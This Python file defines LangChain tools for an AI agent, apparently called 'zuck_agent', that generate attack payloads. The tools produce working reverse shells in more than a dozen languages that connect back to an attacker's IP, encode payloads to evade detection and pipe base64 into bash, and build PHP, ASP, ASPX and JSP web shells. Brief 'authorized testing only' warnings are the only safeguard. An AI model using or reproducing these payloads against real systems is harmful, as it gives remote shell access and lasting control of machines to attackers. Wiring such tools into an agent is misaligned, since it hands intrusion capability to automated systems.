"""
Payload and reverse shell generator for penetration testing.

WARNING: This tool is for authorized security testing only.
"""

import json
import logging
import base64
from urllib.parse import quote

from langchain.tools import tool

logger = logging.getLogger('zuck_agent')


@tool
def generate_reverse_shell(shell_type: str, ip: str, port: int) -> str:
    """
    Generate reverse shell payloads for penetration testing.
    
    WARNING: Use only for authorized security testing.
    
    Args:
        shell_type: Type of shell - bash, python, php, perl, ruby, nc, powershell
        ip: Attacker's IP address
        port: Listening port
        
    Returns:
        Reverse shell payload
        
    Examples:
        generate_reverse_shell("bash", "10.10.10.1", 4444)
        generate_reverse_shell("python", "192.168.1.100", 9001)
    """
    try:
        shell_type = shell_type.lower().strip()
        
        shells = {
            "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "bash_udp": f"bash -i >& /dev/udp/{ip}/{port} 0>&1",
            "sh": f"/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1",
            
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            
            "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "php_exec": f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");?>",
            
            "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            
            "nc": f"nc -e /bin/sh {ip} {port}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "ncat": f"ncat {ip} {port} -e /bin/sh",
            
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            
            "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
            
            "awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null"
        }
        
        if shell_type not in shells:
            return json.dumps({
                "error": f"Unknown shell type: {shell_type}",
                "available_types": list(shells.keys())
            }, indent=2)
        
        payload = shells[shell_type]
        
        result = {
            "type": shell_type,
            "attacker_ip": ip,
            "attacker_port": port,
            "payload": payload,
            "listener_command": f"nc -lvnp {port}",
            "warning": "Use only for authorized penetration testing!"
        }
        
        return json.dumps(result, indent=2)
        
    except Exception as e:
        logger.error(f"Payload generator error: {e}")
        return f"Error: {str(e)}"


@tool
def encode_payload(payload: str, encoding: str = "base64") -> str:
    """
    Encode a payload to evade detection.
    
    Args:
        payload: Payload string to encode
        encoding: Encoding type - base64, url, hex, unicode
        
    Returns:
        Encoded payload
        
    Examples:
        encode_payload("whoami", "base64")
        encode_payload("<script>alert(1)</script>", "url")
    """
    try:
        encoding = encoding.lower().strip()
        
        encodings = {
            "base64": base64.b64encode(payload.encode()).decode(),
            "url": quote(payload),
            "hex": payload.encode().hex(),
            "unicode": "".join(f"\\u{ord(c):04x}" for c in payload),
            "html": "".join(f"&#{ord(c)};" for c in payload)
        }
        
        if encoding not in encodings:
            return json.dumps({
                "error": f"Unknown encoding: {encoding}",
                "available_encodings": list(encodings.keys())
            }, indent=2)
        
        result = {
            "original": payload,
            "encoding": encoding,
            "encoded": encodings[encoding]
        }
        
        # Add decode command for base64
        if encoding == "base64":
            result["decode_command"] = f"echo '{encodings[encoding]}' | base64 -d | bash"
        
        return json.dumps(result, indent=2)
        
    except Exception as e:
        logger.error(f"Encode payload error: {e}")
        return f"Error: {str(e)}"


@tool
def generate_webshell(shell_type: str, password: str = "") -> str:
    """
    Generate web shell payloads for testing.
    
    WARNING: Use only for authorized security testing.
    
    Args:
        shell_type: Type - php, asp, aspx, jsp
        password: Optional password protection
        
    Returns:
        Web shell code
        
    Examples:
        generate_webshell("php")
        generate_webshell("php", "secret123")
    """
    try:
        shell_type = shell_type.lower().strip()
        
        if password:
            shells = {
                "php": f"<?php if($_GET['pwd']=='{password}'){{system($_GET['cmd']);}}?>",
                "php_eval": f"<?php if($_POST['pwd']=='{password}'){{eval($_POST['cmd']);}}?>",
            }
        else:
            shells = {
                "php": "<?php system($_GET['cmd']);?>",
                "php_passthru": "<?php passthru($_GET['cmd']);?>",
                "php_shell_exec": "<?php echo shell_exec($_GET['cmd']);?>",
                "php_eval": "<?php eval($_POST['cmd']);?>",
                "asp": "<%eval request(\"cmd\")%>",
                "aspx": "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(Request[\"cmd\"]);%>",
                "jsp": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
            }
        
        if shell_type not in shells:
            return json.dumps({
                "error": f"Unknown shell type: {shell_type}",
                "available_types": ["php", "php_passthru", "php_shell_exec", "php_eval", "asp", "aspx", "jsp"]
            }, indent=2)
        
        shell = shells[shell_type]
        
        result = {
            "type": shell_type,
            "password_protected": bool(password),
            "shell": shell,
            "usage": f"http://target/shell.php?cmd=whoami" + (f"&pwd={password}" if password else ""),
            "warning": "Use only for authorized penetration testing!"
        }
        
        return json.dumps(result, indent=2)
        
    except Exception as e:
        logger.error(f"Webshell generator error: {e}")
        return f"Error: {str(e)}"
